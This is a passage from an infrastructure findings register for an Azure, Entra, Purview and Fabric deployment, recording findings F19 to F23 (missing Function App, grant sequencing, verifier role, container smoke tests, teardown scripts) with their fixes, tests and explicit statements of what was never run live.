no entitlement check anywhere. All three defects are closed together, since fixing the
brief's two while leaving the third standing would have reproduced F18's own shape inside
the file F18 exists to fix. **(1) Policy publish:** `labels.ps1` gains
`Get-LabelPolicyScope` (the four demo groups `infra/entra/manifest.json` names —
`mls-flight-operations`, `mls-security-team`, `mls-finance`, `mls-executives`) and
`Initialize-LabelPolicy`, wired into `Invoke-Main` — create-if-absent via
`New-LabelPolicy`, update-in-place on label-list or scope drift via `Set-LabelPolicy`'s
`Add`/`RemoveLabel` and `Add`/`RemoveExchangeLocation` parameters, same shape as
`Initialize-SensitivityLabel`, gated by `-WhatIf` the same way. **(2)
`auto-label-design.md`:** authored, design-only, recording what a real Fabric-native
implementation would need and why this one doesn't attempt it (see (3)). **(3) The
auto-label claim:** corrected in `L04.md` rather than implemented — the claim was wrong
independent of licensing. `labels.ps1`'s only authenticated surface is a Security &
Compliance PowerShell session; the cmdlets that actually apply auto-labeling
(`New-AutoSensitivityLabelPolicy`/`Set-AutoSensitivityLabelPolicy`) scope only to
Exchange/SharePoint/OneDrive/Teams locations, none of which is a Fabric workspace, so
even a perfect AIP-P2 entitlement check would have nothing to gate: there is no "same
script" apply path to build. Implementing a fake runtime check against a mechanism that
doesn't reach Fabric would have been a second, self-inflicted instance of the same
defect this finding closes, so `L04.md`'s Deploy procedure step 2 and Failure mode 4 now
say this plainly instead. `verification/layer-04-audit.ps1` gains a **V4.3** criterion
(`Test-LabelPolicyScope`, read-only — `Get-LabelPolicy`, the `mls-verifier` View-Only
Configuration role's `Get-Label` counterpart) asserting the policy exists with exactly
the four labels and exactly the four demo groups; it is supplementary, not a
master-plan criterion, documented in `L04.md`'s Validation cycle but deliberately not
added to `docs/runbooks/layers/README.md`'s 43-row traceability table or
`.github/README.md`'s per-script summary (same convention CP-9's V6.5 already uses).
TDD: 9 new/updated assertions in `infra/purview/tests/labels.Tests.ps1` and 5 in
`verification/tests/layer-04-audit.Tests.ps1` — policy publish, idempotent replay,
label-drift and scope-drift update-in-place in both add/remove directions, `-WhatIf`
making no mutating policy calls, V4.3 PASS/FAIL on missing policy / missing group /
extra group / missing label, and V4.1 staying independent of a V4.3 failure — all
failed against the pre-fix files (mutation-checked: reverted, confirmed RED, restored);
all pass after the fix. CM-6 closes outright — F18 was its sole contributor (see
`compliance/assessment/CM-6.json`).

---

## F19

**cost-ingest documented as deployed; deploys nowhere**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** none — no 800-171 control (availability/completeness)
- **Closed by:** F19 remediation (commit c33f06e)
- **Status:** CLOSED
- **Note on the record:** no `compliance/assessment/` record exists for F19 (it maps to no NIST SP 800-171 control); this entry and the findings-index table's `Closed by` column are its only durable record. It is nonetheless cited in `compliance/assessment/3.1.1.json`, `3.1.2.json` and `3.1.5.json` as the finding whose closure let F13's seventh grant exist at all.

**Where:** `.github/workflows/infra-up.yml:31` — "WHERE THE FINOPS LEG LIVES. `apps/cost-ingest` (Cost Management daily export → storage → consumption Function → lakehouse `cost_daily`) is an L6 resource and deploys inside layer-06-platform.yml alongside the export wiring it consumes." `apps/cost-ingest/README.md:143`'s RBAC table says the identity's grants are "granted by L6's Bicep".

**Verified absent, not merely undocumented:** `grep -rn cost-ingest infra/` returns zero matches — no Bicep resource of any kind. `grep -n "cost-ingest|functionapp|Microsoft.Web" .github/workflows/layer-06-platform.yml` also returns zero matches — the workflow that is supposed to deploy it creates an Azure SQL schema, loads ten tables, and wires the Cost Management export definition, and nothing else. There is no Function App, and therefore no identity, for cost-ingest anywhere in this repo's infrastructure.

**Found while:** implementing Task 12 (F13) — `cost-ingest -> Storage Blob Data Reader` is one of F13's seven documented workload grants. There is no principalId to grant that role to, because the principal does not exist.

**Impact:** cost-ingest is not on the critical demo path and nothing silently mis-secures as a result of this gap on its own — it simply will not exist when `apps/cost-ingest` or `infra-up.yml`'s own commentary says it will. A sponsor or adopter who reads `infra-up.yml:31` or the README's RBAC table and concludes the FinOps leg is live would be wrong; the daily Cost Management export (once Task 17/F15 lands) would write to storage with nothing downstream ever reading it into the lakehouse.

**Fix:** either provision `apps/cost-ingest` as a real Azure Function App with its own user-assigned identity (new deploy surface, new spend decision against the sponsor's 30-day credit — a G2-shaped decision, not a remediation-task one), or correct `infra-up.yml:31` and the README's RBAC table to state plainly that the Function does not deploy yet. Do not build the Function App as part of closing F13 or F19 without that decision being made explicitly.

**Closed (2026-08-28, commit c33f06e) — the first branch of that Fix, on explicit sponsor authorisation.** The Fix above forbids building the Function App without an explicit decision; the sponsor gave one, so this is the built branch and not the documentation branch.

*What was built.* `infra/bicep/platform/main.bicep` now provisions, all in `mls-rg-ops` beside the cost-export storage it reads: the Function App, a **Flex Consumption (FC1)** plan, a **user-assigned identity** (`<prefix>-cost-ingest-<env>-id`), a second, empty storage account for the Functions runtime, an Event Grid system topic on the cost-export account, and four role assignments. `.github/workflows/layer-06-platform.yml` publishes the code and creates the blob-created event subscription; `.github/workflows/layer-07-apps.yml` issues the Fabric workspace grant. `infra-up.yml:31`'s claim is now true, and says so in its own text.

*The spend decision, stated so it can be checked rather than trusted.* Idle cost is **unchanged**. Flex Consumption has no per-plan charge and bills only execution GB-seconds; the plan declares **no `alwaysReady` instances**, which is the single setting on that plan that would bill at rest, and adding one later is a G2 change rather than a tuning change. The workload is one Cost Management export a day — roughly 30 invocations a month of a few seconds each at the smallest (512 MB) instance size, inside the monthly free grant. The two supporting resources are an empty `Standard_LRS` storage account (cents; it holds host bookkeeping and the deployment package, never export data) and an Event Grid system topic (the first 100,000 operations a month are free; this uses about 30). Against the $200/30-day credit the delta is at the noise floor, which is why this did not turn into a G2 escalation in practice — but the authorisation was obtained regardless, because the Fix text required it.

*Why Flex Consumption and not the plan the README used to name.* The app's own `src/config.ts` states that no setting it reads may be a credential (CLAUDE.md hard rule 5), and a Functions host needs an `AzureWebJobsStorage` connection. Per Microsoft's plan matrix, Flex Consumption supports managed identity for host storage **and uses no Azure Files at all**; the legacy Consumption and Elastic Premium plans support managed identity for blobs/queues/tables but still require `WEBSITE_AZUREFILESCONNECTIONSTRING`, a shared-key connection string their own guidance says to hide in Key Vault. Hiding a credential is not the same as not having one. The only other plan with full managed-identity host storage is Dedicated, whose cheapest usable tier bills ~$13/month around the clock — 6.5% of the whole credit, permanently, for 30 executions.

*Two consequences, stated rather than buried.* (1) Flex Consumption supports **only** the Event Grid-based blob trigger, so `apps/cost-ingest/src/functions/cost-ingest.ts` now declares `source: "EventGrid"` and the event subscription is created by the workflow — it cannot be Bicep, because its webhook URL embeds the app's `blobs_extension` system key, which does not exist until the site does and which `listKeys` would both fail on at `what-if` time and print into a public workflow log (F4's failure mode). The key is masked and never written to an output, a job summary or an artifact. (2) The Functions host needs **account-wide** blob, queue and table access to its own storage, so the runtime deliberately uses a **second** storage account: consolidating onto the cost-export account would have handed the identity Owner-class blob access to the very container F13's seventh grant narrows it to, making that grant decorative.

*A latent defect found while doing it.* The trigger's container fallback read `costexports`, a container nothing in this estate creates — L6's Bicep, the export definition and the L6 audit's V6.3 all use `cost-exports`. L6 sets `COST_EXPORT_CONTAINER` explicitly so the fallback was never going to be reached here, but a fallback naming a container nobody creates is a trigger that silently never fires. Corrected. It is the same one-hyphen mismatch [F15](#f15) already fixed once on the export side.

*What is verified, and what is not.* `verification/tests/cost-ingest.Tests.ps1` (43 assertions) checks the Bicep and workflow shape against comment-stripped sources (F27): the Storage Blob Data Reader **GUID** and the **container** scope, that the account-wide host roles bind only to the runtime account, that no forbidden GUID appears anywhere, that no connection string or Azure Files setting is introduced, that the plan carries no always-ready instances, and that the system key is masked and never persisted. `infra/fabric/tests/provision-workspace.Tests.ps1` gained six assertions on the Fabric role string per principal. Three surgical mutations were run and each turned exactly the intended assertions red — widening the container grant to account scope (1 red), dropping the user-assigned identity (1 red), widening the Fabric role to Member (6 red). **Not claimed:** nothing here has been deployed. No Azure, Entra or Fabric call was made to build or test it; the evidence is authored IaC and static tests over this repository, not a running system, and the end-to-end path (Cost Management's first export can take 24 h — L06 V6.3) remains unexercised by design.

---

## F20

**data-api's contained-user grant is expressed but never applies**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** none — no 800-171 control (availability)
- **Closed by:** Task 22
- **Status:** CLOSED

**Where:** `data/seed/sql/sql-seed.psm1`'s `Install-SeedSchema` (`Get-ChildItem -Filter *.sql | Sort-Object Name`, applied unconditionally, no error tolerance — `Invoke-SeedSqlCommand` uses `ErrorAction Stop`); `.github/workflows/layer-06-platform.yml`'s single `data/seed/seed.ps1 -Target sql` invocation; `.github/workflows/layer-07-apps.yml`, which (before Task 22) never invoked it a second time.

**The mechanism:** `data/seed/sql/900-contained-users.sql` (Task 12, F13) expresses `CREATE USER [mls-data-api-demo-id] FROM EXTERNAL PROVIDER;` — correct code, and it is genuinely idempotent once it succeeds. But `seed.ps1 -Target sql` ran exactly once, inside L6, which completes before L7 creates the data-api user-assigned identity. On that first pass the statement cannot resolve the AAD principal and is guarded to fail loudly rather than abort the rest of the DDL (`BEGIN TRY/CATCH` with a severity-10, non-terminating `RAISERROR` — see that file's header). The guard protects L6's existing, working SQL seed from a regression; by itself it does not make the grant apply. Before Task 22, nothing re-ran the seed script after L7, so in a single `infra-up.yml` pass the grant never landed in a live tenant.

**Distinct from F13, deliberately not folded into it:** F13 is "zero workload RBAC expressed in IaC" — the `.sql` file genuinely is that expression, so F13's remedy is satisfied for this one grant. The defect here is different in kind: the code that would make the grant real is never invoked at the right time. Folding this into F13's rationale would make it close silently the moment F13's other two grants land (Task 17, F19), and the sequencing bug would vanish with it.

**Impact (before Task 22):** `data-api` 403s against Azure SQL until someone manually re-runs `data/seed/seed.ps1 -Target sql` after L7 — the same "dated failure" shape F13 itself describes (days 7-14 of the sponsor's 30-day clock, once G0 item C9 sets `fabricSqlEndpoint`), just one layer further down: the code now exists, but nothing calls it a second time.

**Fix (as originally proposed):** add a step to `.github/workflows/layer-07-apps.yml`, after the data-api identity is created, that re-invokes `data/seed/seed.ps1 -Target sql` (idempotent — the other nine tables and the `schema_version` stamps are all no-ops on a second run) so the grant actually lands in a standard `infra-up.yml` pass.

**Closed (Task 22) — and the trap the obvious fix walks into:** a plain second `seed.ps1 -Target sql` does reach `Install-SeedSchema` — that function already applies every `data/seed/sql/*.sql` file unconditionally, before the row-count check, so the load short-circuit alone was never actually the blocker (proved by `data/seed/tests/sql-seed.Tests.ps1`'s pre-existing `'still applies the DDL, because that is guarded and free'` test). The real blocker is upstream: `Assert-SqlSeedPrerequisite` requires `data/generated/` to be complete, and `seed.ps1`'s step 1 tries to build it with `python -m generators build` when it isn't — and the L7 apps-deploy job has no Python toolchain and a freshly checked-out, gitignored (so absent) `data/generated/`. A literal re-invocation therefore throws before `Install-SeedSchema` ever runs, for a DDL-only statement that never needed a dataset in the first place.

Fixed with a dedicated invocation mode rather than `-Force` (which the controller ruled out: `-Force` means wipe-and-reload, turning one idempotent grant into a full reseed of ten operational tables against Azure SQL serverless — paying auto-resume and minutes of runtime for no reason). `data/seed/seed.ps1` and `data/seed/sql/sql-seed.psm1`'s `Invoke-SqlSeed`/`Assert-SqlSeedPrerequisite` gained a `-SchemaOnly` switch (`-Target sql` only): it skips dataset generation entirely, skips the `data/generated/` completeness check, applies the DDL via `Install-SeedSchema`, and returns — no row-count probe, no wipe, no load. `.github/workflows/layer-07-apps.yml`'s `deploy` job now resolves the Azure SQL server/database directly from Azure (`az sql server list` / `az sql db list` against the platform resource group, under the same `mls-github-deployer` credential L6 already uses to run this DDL) and calls `./data/seed/seed.ps1 -Target sql -SchemaOnly ...` right after "Deploy the apps" — warning and skipping, rather than failing the job, when no server is found yet (a standalone L7 dispatch ahead of L6). Placed in the layer workflow rather than `infra-up.yml` so a standalone `layer-07-apps.yml` dispatch lands the grant too, and `infra-up.yml` inherits it by calling that workflow.

Covered by `data/seed/tests/sql-seed.Tests.ps1`'s `-SchemaOnly` context: `Install-SeedSchema` fires and `AppliedDdl` carries the grant file even when `Get-SeedTableRowCount` is mocked to throw if called at all (proving the path never depends on — and never gates on — row counts, which is the second-run scenario this finding is about), `Clear-SeedTable`/`Import-SeedTable` are never invoked, and `Assert-SqlSeedPrerequisite` is called with `-SchemaOnly` so its dataset check is provably bypassed rather than merely satisfied by a fixture. `data/seed/tests/seed.Tests.ps1` covers the orchestration layer: `-SchemaOnly` skips dataset generation even when the dataset is reported incomplete, forwards `-SchemaOnly` to `Invoke-SqlSeed`, and is rejected outright with `-Target lakehouse` or `-Target both` (it has no lakehouse equivalent). Not claimed: this has never run against a live tenant — no Azure/SQL connection was made to build or test it, per this branch's constraints — so the `az sql server/db` resolution and the live `Install-SeedSchema` DDL application are verified by code reading and mocked-transport/mocked-`Invoke-Sqlcmd` tests only, not by an end-to-end run.

---

## F21

**mls-verifier's documented Fabric workspace Viewer grant does not exist**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** none — no 800-171 control (availability — breaks the Verifier's sign-off gate CLAUDE.md treats as authoritative)
- **Closed by:** Task 21
- **Status:** CLOSED

**Where:** `infra/fabric/provision-workspace.ps1` (before this task's correction) asserted at lines 19-22: "at L5 the `mls-verifier` service principal is granted the workspace VIEWER role on `mls-operations`... That grant happens in the L5 deploy path, not in this script." `verification/layer-05-audit.ps1:57` builds its Fabric bearer header on that same assumption ("workspace Viewer, granted"). `.github/workflows/layer-05-fabric.yml`'s step named "Azure login (OIDC, mls-verifier — Reader + workspace Viewer)" only logs in — it grants nothing.

**Verified absent, not merely undocumented:** before Task 12 added `Add-FabricWorkspaceRoleAssignment`/`Get-FabricWorkspaceRoleAssignment`, `infra/fabric/fabric-api.psm1` had no role-assignment function at all (every function in the file, lines 27-468, grepped for `roleAssignment|Viewer|grant` — zero hits). `grep -n "Viewer|roleAssignment|grant" .github/workflows/layer-05-fabric.yml -i` returns only the job-step label quoted above, which calls nothing.

**Found while:** implementing Task 12 (F13) — the instruction to "use the existing REST path in infra/fabric/fabric-api.psm1 rather than inventing a new one" for data-api's Fabric Viewer grant assumed a role-assignment wrapper already existed. It did not; one was added for data-api's (different) grant, which is how this gap surfaced.

**Impact:** if `mls-verifier` genuinely has no Fabric workspace role, the entire L5 Verifier audit 403s in live operation, independent of F13. CLAUDE.md's core control is "a layer is DONE only on the Verifier's sign-off, running as mls-verifier (Reader), never as the deployer SP" — a Verifier that cannot authenticate to the Fabric REST API cannot produce that sign-off for L5 at all. Same class as F6 (verifier had no federated credential): a control whose absence is invisible until the moment the estate depends on it.

**Fix:** grant `mls-verifier`'s principal the Fabric workspace Viewer role using the same `Add-FabricWorkspaceRoleAssignment` function Task 12 added for data-api (a different call, a different principal, a different finding) — from the L5 deploy path (`layer-05-fabric.yml`), matching what the corrected docstring now says is NOT yet true rather than what the original docstring falsely claimed was already true.

**Closed (Task 21):** `infra/fabric/provision-workspace.ps1` gained a `-VerifierPrincipalId` parameter, empty by default (no-op, same shape as `-DataApiPrincipalId`), which grants exactly workspace **Viewer** — never broader — via the existing `Add-FabricWorkspaceRoleAssignment`/`Get-FabricWorkspaceRoleAssignment` pair, checking for an existing `Viewer` assignment first so a replay is a no-op. `.github/workflows/layer-05-fabric.yml`'s `deploy` job (authenticated as `mls-github-deployer`, which becomes the workspace's Admin on creation and so can grant roles in it) now resolves `mls-verifier`'s service-principal **object ID** — Fabric role assignments need the object ID, not the application/client ID, and only `AZURE_VERIFIER_CLIENT_ID` (the client ID) is configured anywhere in this estate — via `az ad sp show --id $AZURE_VERIFIER_CLIENT_ID` (the deployer already holds Graph `Directory.Read.All`), and passes the result to `-VerifierPrincipalId`. The step is skipped, not failed, when `AZURE_VERIFIER_CLIENT_ID` is unset (same "unverified rather than broken" shape the rest of this layer already uses); it hard-fails the run if the lookup resolves to nothing, rather than silently granting nobody. `verification/layer-05-audit.ps1:57`'s Fabric bearer-header assumption now holds. Covered by `infra/fabric/tests/provision-workspace.Tests.ps1`'s new `'mls-verifier workspace Viewer grant (F21)'` context (mocked Fabric API, zero cloud calls): the grant fires exactly once with `Role -eq 'Viewer'` when a principal ID is supplied and none exists yet, is skipped when an existing `Viewer` assignment is found (idempotent replay), never fires with a role other than `Viewer`, stays a no-op when the parameter is omitted, and composes correctly alongside the pre-existing data-api grant in the same run. Not claimed: this has never been exercised against a live tenant — no Azure/Fabric connection was made to build or test it, per this branch's constraints — so the `az ad sp show` resolution and the live Fabric `roleAssignments` call are verified by code reading and mocked-transport tests only, not by an end-to-end run.

---

## F22

**Container images never smoke-tested in CI**

- **Severity:** medium
- **Confidence:** CONFIRMED
- **Controls:** none — no 800-171 control (availability)
- **Closed by:** Task 24
- **Status:** CLOSED

**Where:** `.github/workflows/app-{control-tower,launch-ops,data-api,mcp-tools}-ci.yml`'s `image` job. Each builds the container (`docker/build-push-action`, `load: true`), Trivy-scans it (`severity: CRITICAL`, `exit-code: '1'`), optionally uploads a SARIF, logs in to GHCR and pushes — and, before this task, never ran `docker run` anywhere in that sequence. The only place the image's entrypoint was ever actually executed was `verification/layer-07-audit.ps1`, which runs post-deployment against a live tenant, long after the image has already been pushed and a revision rolled onto the container app.

**Verified absent, not merely undocumented:** `grep -n "docker run" .github/workflows/app-*-ci.yml` returned zero matches across all five workflows before this task. Each `image` job's own step list — checkout, compute the GHCR reference, buildx setup, build, Trivy gate, Trivy SARIF, SARIF upload, GHCR login, push — has no step between "build" and "push" that starts the container, confirmed by reading all four files end to end.

**Found while:** implementing Task 14 (F11, the frontends' CSP/nonce hardening), which in the same pass also moved both frontend images to run as `USER nginx` (a defense-in-depth fix that was never part of F11 itself, folded in because it touched the same Dockerfiles). The Task 14 reviewer flagged, as an "Important" finding, that this new hardening had no way to prove itself: `/etc/nginx/conf.d` not staying writable by `nginx` makes the base image's entrypoint skip its `envsubst` templating pass silently (`20-envsubst-on-templates.sh` checks `[ -w "$output_dir" ]` and no-ops rather than erroring) and fall back to nginx's own stock "Welcome to nginx!" config — which still answers HTTP 200 on `/`. A CI pipeline that never starts the container cannot catch that regression, or any other "the image builds and scans clean but the entrypoint serves the wrong thing" failure mode, before it reaches a live container app.

**Impact:** the gap was not specific to the `USER nginx` change — it is general: nothing between `docker build` and the image reaching the registry (and from there, a container app revision) ever executes the entrypoint. A broken `CMD`, a missing runtime dependency pruned by `npm prune --omit=dev` too aggressively, a `USER` with no permission to bind the listening port, or exactly the silent-stock-page failure mode above would all pass Trivy (they are not vulnerabilities) and pass the Node/TypeScript unit suites (which never import the built image) and only surface once `verification/layer-07-audit.ps1` runs against the live tenant — by which point the broken image has already been pushed to GHCR and rolled onto a container app. Same class as F5 (a CI gap meaning something is never actually exercised), not a document-vs-code mismatch like most of F14–F21.

**Fix:** add a step to each `image` job, after the image exists and the Trivy CRITICAL gate has already passed (so a vulnerable image is never started) and before any registry credential enters the job (`docker/login-action`), that runs the built image detached, polls `GET /healthz` with a bounded timeout, asserts the response is the app's own payload rather than merely a 200 (see the mechanism note below for which half of that actually catches the F14 case), dumps `docker logs` on any failure, always stops and removes the container, and fails the build (no `continue-on-error`) on a bad payload.

**Closed (Task 24):** all five `image` jobs gained a step named `Smoke-test the image — boot it and check its own /healthz (F22)`, placed immediately after `Upload the Trivy SARIF` and immediately before `Log in to GHCR`. The brief's two placement constraints conflict for this job by construction — "keep it in the job that already holds the image" and "do not put it in a job holding `id-token: write` or `packages: write`" — because the `image` job that holds the built image is the same job that pushes it and therefore holds `packages: write` (and `security-events: write`) in every one of these four workflows; there is no job satisfying both. The placement chosen honours the constraint that actually protects something: the step runs after the CRITICAL gate (a vulnerable image is never started) and before `docker/login-action` (no registry credential has entered the job's environment when the container is running).

Each step: `docker run -d` on a loopback-only published port (`-p 127.0.0.1::8080`, host port chosen by Docker and resolved via `docker port`, not a fixed port — avoids any collision on the runner); polls `GET /healthz` in a 30×2s-bounded loop via `curl -s --max-time 3 -w '\n%{http_code}'` (never a single sleep-then-curl); asserts HTTP 200 *and* an app-specific discriminator (not a bare 200, which the stock nginx page also satisfies); dumps `docker logs` on every failure path before `exit 1`; always stops and removes the container via `trap cleanup EXIT`, so cleanup runs on success, on an assertion failure, and on any unexpected early exit under `set -euo pipefail`; carries no `continue-on-error` (unlike the F20 grant step in `layer-07-apps.yml`, which is deliberately advisory because it is remediation, not verification — this is a merge gate). The container is handed no secret: no `secrets.*`, no `GITHUB_TOKEN`, no `--env-file`, no volume mount of the workspace.

The discriminator differs per app, each verified by reading the actual route handler rather than assumed: control-tower and launch-ops (`nginx.conf.template`'s `location = /healthz`) answer `text/plain` `"ok ${MLS_IMAGE_DIGEST}\n"`, whose Dockerfile `ENV MLS_IMAGE_DIGEST=unset` default makes the expected body `ok unset` — so the check asserts HTTP 200 **and** a body matching `^ok `.

**Which mechanism actually catches the F14 regression (corrected by the Task 24 review).** An earlier draft of this entry claimed the untemplated container would answer `/healthz` with a 404. That is not what happens on the wire, and the distinction is worth stating precisely because a register that describes the wrong mechanism is the same defect class as F2, F17, F18 and F23. `apps/control-tower/Dockerfile:55-56` records the real fallback: skipped templating leaves nginx serving its stock `Welcome to nginx!` config **on port 80**, while this app's template is the only thing that ever says `listen 8080;`. The smoke step publishes and curls **8080 only**. So an untemplated image accepts no connection at all on the polled port, and the gate fails through the poll's bounded-timeout branch ("never accepted a connection"), not through a 404 on `/healthz`.
The `^ok ` discriminator is therefore not the mechanism that catches *this* regression — it is an independent second guard covering every other "something answers 8080 but it is not this app" case, which a bare 200 check would pass. Both are wanted; only the timeout branch is load-bearing for F14. data-api (`src/app.ts`'s `/healthz` handler) answers JSON with `service: "data-api"`; the check asserts `.service == "data-api"`. mcp-tools (`src/app.ts`'s `/healthz` handler) answers JSON with **no** `service` field — asserting one there would be a false discriminator that happens to never fire — so the check asserts `.ok == true and .transport == "streamable-http"` instead.

mcp-tools also needed a boot-time accommodation unrelated to F22 itself: `apps/mcp-tools/src/auth-gate.ts`'s `loadInboundAuth` (F2's fix, Tasks 4–5) throws at startup in every mode unless `MCP_AUTH_TOKEN` or `MCP_ALLOW_UNAUTHENTICATED` is set, because the container app's ingress is external regardless of backend mode. A bare `docker run` of that image exits immediately and would look like an image defect rather than a missing setting. The smoke step passes `-e MCP_ALLOW_UNAUTHENTICATED=true` — a boolean opt-out, not a token, authenticating nothing, and `/healthz` is unauthenticated at the ingress regardless since the gate is scoped to the `/mcp` route only. The other three images needed no environment at all to boot: control-tower and launch-ops default `DATA_API_ORIGIN` and `MLS_IMAGE_DIGEST` in their Dockerfiles, and data-api defaults `MLS_DATA_BACKENDS` to `local` (`src/config.ts`) with `LocalTablesBackend` reading `data/generated/*.json` lazily per request rather than at boot, so `/healthz` answers before any table route would ever be called.

Covered by `verification/tests/app-ci-smoke-test.Tests.ps1` — a workflow-shape assertion (GitHub Actions `run:` steps have no unit-test harness, same approach as `no-secret-outputs.Tests.ps1` and `self-heal-selection.Tests.ps1`), since the runtime behaviour itself cannot execute without a Docker daemon, unavailable on this dev host. Placement is asserted by **line-number comparison** (the smoke step's line strictly between the Trivy gate's and `Log in to GHCR`'s, and strictly before the push step's), not mere substring presence, across all five workflows; per-app discriminator payloads, the bounded retry loop, the `docker logs`-before-every-`exit 1` invariant, the EXIT-trap cleanup, the absence of `continue-on-error`, and the absence of any credential/mount in the step are each asserted directly against the extracted step body. Five behaviours were mutation-tested one at a time against the real workflow files (placement after `Log in to GHCR`, the F14 discriminator regex, the EXIT-trap cleanup, an added `continue-on-error: true`, and the mcp-tools auth opt-out) — each neutering flipped exactly the expected assertion(s) red and nothing else, confirmed by re-running the suite and then restoring the file to its pre-mutation content before the real commit. Not claimed: this has never been exercised against a live Docker daemon or a live tenant — no container was actually started to build or verify this fix, per this branch's constraints — so the smoke step's own correctness rests on code reading, the step order other app-*-ci.yml jobs already establish, and the route handlers' source, not an end-to-end CI run.

---

## F23

**Three G3 full-tenant teardown scripts the runbooks instruct operators to run did not exist**

- **Severity:** high
- **Confidence:** CONFIRMED
- **Controls:** CM-6 (NIST SP 800-53 Rev 5 — tailored out of 800-171, the same control F18 maps to)
- **Closed by:** Task 25
- **Status:** CLOSED
- **Remediation record:** `compliance/assessment/CM-6.json`

**Where:** `docs/runbooks/kill-rebuild.md` § 7 is a NUMBERED OPERATOR PROCEDURE for G3
full-tenant teardown / handback. Steps 1, 2 and 4 instructed a human to run
`infra/purview/teardown.ps1`, `infra/entra/teardown.ps1` and
`infra/policy/teardown.ps1`, in that order. `docs/runbooks/layers/L02.md:129`,
`L03.md:184` and `L04.md:148` each carried the matching per-layer Teardown-section
claim. Step 1 self-labelled its path `[derived name, per L04]` — the runbook's own
author flagged the path as a guess rather than a path it had verified, and never
followed up.

**Verified absent, not merely undocumented:** before this task, none of the three
paths existed anywhere in the tree. `infra/fabric/teardown-items.ps1` was the ONLY
teardown script ever written for any layer. `infra/entra/` had an apply script
(`apply-entra.ps1`) and a manifest but no teardown counterpart; `infra/purview/`
had `labels.ps1` (create/update only) and no teardown counterpart; `infra/policy/`
did not exist as a directory at all, because **L2 has no apply script either** — it
deploys `infra/bicep/landing-zone/main.bicep` straight from a GitHub Actions step
(`az deployment mg create` in `layer-02-landing-zone.yml`), so L2 was missing two
legs of CLAUDE.md's triplet, not one.

**Found while:** reviewing Task 20's closure of F18 (the sibling CM-6 gap:
sensitivity labels published nowhere). The reviewer first flagged
`infra/purview/teardown.ps1` specifically, as missing. The controller then ran a
repo-wide teardown census rather than accepting a single-file fix, and the census
surfaced two more absent scripts with the identical shape, both referenced by the
same runbook section.

**Every workflow reference to these three paths was a comment, not an executed
step** — `layer-02-landing-zone.yml:12`, `layer-03-entra.yml:10`, and the
commentary in `infra/purview/labels.ps1`'s own header all NAME the path without
ever invoking it — so no pipeline crashed and nothing in CI surfaced the gap. The
exposure is purely operational: an operator performing a real tenant handback, by
following `kill-rebuild.md` § 7 exactly as written, would hit file-not-found on
step 1, and either halt (leaving steps 2–5 undone) or skip ahead past the failure
(leaving the same objects in place while believing the procedure completed). Either
way, the documented outcome — tenant wiped clean for handback — does not occur.
Per `infra/entra/manifest.json` and `infra/bicep/landing-zone/main.bicep`, what
persists in a tenant whose owner has been told it is gone: 5 users, 4 groups, 3 app
registrations and 2 Conditional Access policies; the four Purview sensitivity
labels and their published policy; management group `mls`, its 14 tag/location
policy assignments, and the NIST SP 800-53 R5 initiative assignment.

**Also a direct CLAUDE.md violation, not only an operational gap:** "Every layer
ships a `deploy` path, a `teardown` script, a `verification/` audit script. A layer
without all three is not done." L2, L3 and L4 each failed that rule outright.

**Fix:** author all three scripts, each safe to author without ever touching a
live tenant (hard rule 1: "Authoring code is always allowed; executing deployments
is not") — `-WhatIf`-able, confirming by default, refusing to run in CI, and
idempotent on an already-absent object — plus a Pester suite proving each property
under mocks.

**Closed (Task 25):** all three scripts now exist, mirroring each layer's own
access pattern rather than inventing a new one. `infra/entra/teardown.ps1` reuses
`apply-entra.ps1`'s exact choke points — every Graph call funnels through
`Invoke-GraphApi`/`Invoke-GraphMutation`, never a `Remove-Mg*` cmdlet — and deletes
only what `infra/entra/manifest.json` lists, never a wildcard sweep, in
reverse-dependency order (CA policies, then app registrations, then groups, then
users). `infra/purview/teardown.ps1` reuses `labels.ps1`'s Security & Compliance
surface (`Get-Label`, `Get-LabelPolicy`, and the new `Remove-Label`/
`Remove-LabelPolicy` calls) and removes the published label policy **before** the
four labels — a label still scoped by a live policy cannot be deleted, so the order
is load-bearing, not cosmetic. `infra/policy/teardown.ps1` is new ground, since L2
never had a PowerShell apply script to mirror: it follows the repo's own `az` CLI
convention instead (the same `Invoke-AzCli`/`Invoke-AzMutation` shape
`scripts/bootstrap/02-fabric-capacity.ps1` already uses), checks `$LASTEXITCODE`
explicitly after every `az` call (`$PSNativeCommandUseErrorActionPreference`
defaults to `$false` in `pwsh`, so a failed native command does not throw on its
own), resolves management group `mls`'s name from `infra/bicep/naming.bicep`
exactly the way `scripts/down.ps1`'s `Get-CompanyPrefix` already does rather than
hardcoding `mls`, and removes in order: the 14 tag/location policy assignments,
then the NIST SP 800-53 R5 initiative assignment (at **subscription** scope, per
`main.bicep`'s own comment that the AVM pattern module fans that one assignment out
to the subscription rather than the management group — the other 14 stay at MG
scope), then moves the subscription back to the tenant root, then deletes MG `mls`
— in that order, because a management group with a child subscription will not
delete.

Every script carries the same safety contract. `-WhatIf` enumerates without
deleting, and confirmation is required by default — but **the function that
carries `ConfirmImpact = 'High'` has to be the one that actually calls
`$PSCmdlet.ShouldProcess`**, not `Invoke-Main`. `ConfirmImpact` does not
propagate from a caller to a callee, so an earlier revision that declared it only
on `Invoke-Main` prompted for nothing at all and deleted everything silently
(F23 review, Critical 1). It now sits on exactly the four functions that call `ShouldProcess`:
`Invoke-GraphMutation` (Entra), `Invoke-AzMutation` (policy), and
`Remove-SensitivityLabel` / `Remove-PublishedLabelPolicy` (Purview). The Entra and
policy `Remove-*` wrappers only *declare* `SupportsShouldProcess` and delegate —
which is what satisfies the analyzer — so they run at the default `ConfirmImpact`
of Medium and deliberately carry no attribute of their own.
Measured both ways: stripping the attribute from `Invoke-Main` changes nothing,
while stripping it from the `ShouldProcess`-calling function restores the silent
delete. A maintainer "tidying up" the callee attribute would reintroduce the bug; a G3 banner
(naming the gate, the exact scope being deleted, and the irreversible consequence —
new label GUIDs, invalidated Entra object IDs, reset policy-compliance data) prints
before any destructive call; each refuses to run when `$env:GITHUB_ACTIONS -eq
'true'` unless `-AllowAutomation` is passed explicitly, and a repo-wide grep
confirms no workflow anywhere passes that switch; an already-absent object is an
informational no-op on every path, never a terminating error; and each ends with
the repo's `if (-not $env:MLS_SKIP_MAIN) { Invoke-Main ... }` guard so Pester can
dot-source it without executing anything.

TDD: 64 assertions across three new test files — `infra/entra/tests/
